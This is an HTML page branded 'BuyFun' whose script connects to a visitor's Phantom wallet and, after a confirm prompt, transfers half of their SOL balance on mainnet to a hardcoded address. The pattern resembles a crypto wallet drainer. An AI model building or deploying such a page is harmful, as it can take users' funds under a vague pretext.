<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BuyFun</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #131A29;
            color: #ffffff;
        }
        h1 {
            color: #9945FF;
        }
        button {
            background-color: #14F195;
            color: #000;
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #13d583;
        }
    </style>
    <!-- Import the Solana Web3 Library -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
</head>
<body>
    <h1>BuyFun</h1>
    <p>Click below to send SOL to a recipient address with full transparency.</p>
    <button id="send-tokens">Send SOL</button>

    <script>
        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ"; // Replace with a valid address
        const networkEndpoint = "https://api.mainnet-beta.solana.com"; // Use Mainnet Beta for live testing

        // Access Solana Web3 library
        const { Connection, PublicKey, Transaction, SystemProgram } = window.solanaWeb3;

        document.getElementById('send-tokens').addEventListener('click', async () => {
            try {
                // Check for Phantom Wallet
                const provider = window.solana;
                if (!provider || !provider.isPhantom) {
                    alert("Phantom Wallet not detected. Please install the Phantom Wallet extension to proceed.");
                    return;
                }

                // Connect to Phantom Wallet
                console.log("Connecting to Phantom Wallet...");
                await provider.connect();
                
                // Check if wallet is connected and public key is available
                if (!provider.publicKey) {
                    console.log("Public key not available after connection.");
                    return;
                }
                console.log("Connected to wallet:", provider.publicKey.toString());

                // Create Solana connection
                const connection = new Connection(networkEndpoint, 'confirmed');

                // Get wallet balance
                const walletBalance = await connection.getBalance(provider.publicKey);
                console.log("Wallet balance (lamports):", walletBalance);

                if (walletBalance <= 0) {
                    alert("Insufficient funds in the wallet to perform this transaction.");
                    return;
                }

                // Calculate amount to send (e.g., 50% of wallet balance as an example)
                const amountToSend = Math.floor(walletBalance * 0.5); // Change percentage as needed
                if (amountToSend <= 0) {
                    alert("Invalid amount to send. Please check your wallet balance.");
                    return;
                }

                // Confirm transaction with the user
                const confirmed = confirm(`Are you sure you want to send ${amountToSend / 1e9} SOL (50% of your balance) to ${recipientAddress}?`);
                if (!confirmed) {
                    alert("Transaction canceled.");
                    return;
                }

                // Create transaction
                const transaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new PublicKey(recipientAddress),
                        lamports: amountToSend, // Amount to send in lamports
                    })
                );

                // Fetch recent blockhash
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = provider.publicKey;

                // Request user signature
                console.log("Requesting transaction signature...");
                const signedTransaction = await provider.signTransaction(transaction);

                // Send the transaction
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                console.log("Transaction signature:", signature);

                // Confirm transaction with stronger finalization level
                await connection.confirmTransaction(signature, 'finalized');
                alert(`Transaction successful! Signature: ${signature}`);
            } catch (error) {
                console.error("Error occurred:", error);
                alert(`Error: ${error.message}`);
            }
        });
    </script>
</body>
</html>
